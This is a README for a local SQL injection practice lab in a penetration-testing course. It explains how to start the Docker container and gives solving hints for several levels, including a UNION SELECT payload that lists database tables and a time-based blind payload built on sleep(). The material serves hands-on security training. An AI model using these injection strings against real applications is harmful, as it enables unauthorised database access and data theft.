# SQLi-Labs: Advanced SQL Injection Mastery

## Overview
Step-by-step progressive SQL injection practice: Union-based, Error-based, Blind Boolean, and Blind Time-based SQLi.

- **Default Port / Access**: `8086`
- **Directory**: `Classes/02_web_penetration_tester/16_advanced_sql_injection/sqli_labs`

---

## How to Solve & Practice

1. Start the lab: `docker compose up -d` and open `http://localhost:8086`.
2. Click 'Setup/reset Database for labs' to initialize tables.
3. Less-1 (Error-based Union injection): `?id=1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--+`
4. Less-5 (Double-injection / Error-based): Extract data using `count(*)`, `concat()`, and `floor(rand(0)*2)` group by errors.
5. Less-8 (Time-based Blind): Extract data character by character using `?id=1' AND IF(version() LIKE '5%', sleep(5), 0)--+`.

---

## YouTube Walkthroughs & Solving Guides

- [Sqli Labs Master Lesson 1 Solution (Error-Based)](https://www.youtube.com/watch?v=HtdGLZOuXXA)
- [Sqli-Labs Series Part 2 Walkthrough](https://www.youtube.com/watch?v=TA2h_kUqfhU)
- [Sqli-Labs Series Part 5 Walkthrough (Double Injection)](https://www.youtube.com/watch?v=0tyerVP9R98)

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
